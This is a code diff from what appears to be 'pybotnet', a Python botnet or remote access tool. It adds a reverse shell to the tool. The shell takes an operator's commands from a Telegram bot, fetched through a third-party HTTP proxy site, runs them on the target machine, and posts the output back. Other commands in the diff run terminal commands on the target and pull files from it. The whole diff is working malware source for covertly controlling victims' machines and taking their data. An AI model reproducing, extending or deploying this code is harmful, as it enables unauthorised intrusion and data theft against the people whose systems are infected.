@@ -2,8 +2,8 @@
 import re
 import os
 import subprocess
-
-from logging import exception
+import requests
+from typing import List
 from time import sleep
 
 from uuid import getnode as get_system_mac_addres
@@ -12,7 +12,7 @@ from requests import get
 # pybotnet import
 from . import util
 from . import settings
-
+import configs
 
 MAC_ADDRES = str(get_system_mac_addres())
 
@@ -27,10 +27,6 @@ scripts_name = {
 
     "cmd": "`cmd <command>`: run command in target terminal",
 
-    "ls": "`ls <route>`: Return a list of folders and files in that path",
-
-    "cd": "`cd <route>`: change directory",
-
     "export_file": "`export_file <download link>`: target donwload this file and save to script path",
 
     "import_file": "`import_file <file route>`: get a file from target system",
@@ -39,7 +35,9 @@ scripts_name = {
 
     "help": "`help`: send this message",
 
-    "/start": "`/start`: run `help` command!"
+    "/start": "`/start`: run `help` command!",
+
+    "reverse_shell": "start reverse shell on target system"
 }
 
 
@@ -60,13 +58,69 @@ def is_command(command) -> bool:
     return False
 
 
-def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
+# reverse shell codes
+def send_message(text: str):
+    ''' get a text and send message in bot'''
+
+    sender_link = f"https://api.telegram.org/bot{configs.TELEGRAM_TOKEN}/SendMessage?chat_id={configs.ADMIN_CHAT_ID}&text={text}"
+    payload = {"UrlBox": sender_link,
+               "AgentList": "Mozilla Firefox",
+               "VersionsList": "HTTP/1.1",
+               "MethodList": "POST"
+               }
+    response = requests.post(
+        url="https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",
+        data=payload,
+        timeout=4)
+
+    return response
+
+
+def reverse_shell(is_shell, ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger):
+    ''' start reverse shell on target system and send response in telegram bot '''
+
+    logger.info("start reverse shell")
+
+    repeat = 0
+    time_out = 500
+
+    while True:
+        if repeat > time_out:
+            break
+
+        pwd = f"{os.getcwd()}=>"
+
+        message_one = util.get_last_admin_command_by_third_party_proxy(
+            ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger)
+
+        if not message_one:
+            if repeat == 0:
+                send_message(pwd)
+            sleep(2)
+            repeat += 1
+            continue
+        else:
+            if message_one == "exit":
+                out_put = "reverse shell exit."
+                send_message(out_put)
+                break
+            else:
+                out_put = execute_cmd(
+                    command=message_one, is_shell=is_shell, logger=logger)
+            send_message(out_put)
+            repeat = 0
+    logger.info("reverse shell exit.")
+    return "reverse shell exit."
+
+
+def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_CHAT_ID: str,
+                    TELEGRAM_TOKEN: str, previous_update_id: List[int], logger):
     command_name = get_command_name(command)
     try:
         if is_command(command):
 
             if command_name == MAC_ADDRES:
-                '''run command just in this system'''
+                '''run command just on this system'''
                 logger.info('delete mac addres and run command ')
                 new_command = ' '.join(split_command(command)[1:])
                 return execute_scripts(new_command, pybotnet_up_time, logger)
@@ -97,6 +151,9 @@ def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
 
             elif command_name in ['help', '/start']:
                 return command_help(logger)
+
+            elif command_name in ['reverse_shell']:
+                return reverse_shell(is_shell, ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger)
 
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
@@ -233,7 +290,7 @@ That\'s why I can\'t get the output text by `cmd` command'''
         return clean_shell_data(result)
 
 
-def execute_cmd(command, is_shell: bool, logger) -> str:
+def execute_cmd(command: str, is_shell: bool, logger) -> str:
     try:
         command = split_command(command)
         if command[0] == 'cmd':
